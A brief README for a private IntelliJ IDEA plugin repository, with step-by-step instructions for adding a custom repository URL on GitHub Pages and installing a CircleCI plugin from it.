CircleCI IntelliJ Plugin Repository

Private plugin repository for the CircleCI IntelliJ IDEA plugin.

Installation

  1. Open IntelliJ IDEA
  2. Go to Settings → Plugins → ⚙️ (gear icon) → Manage Plugin Repositories
  3. Add this repository URL: 
    https://turbo-adventure-n2z6qlm.pages.github.io/updatePlugins.xml
  4. Search for "CircleCI" in the Marketplace tab
  5. Click Install
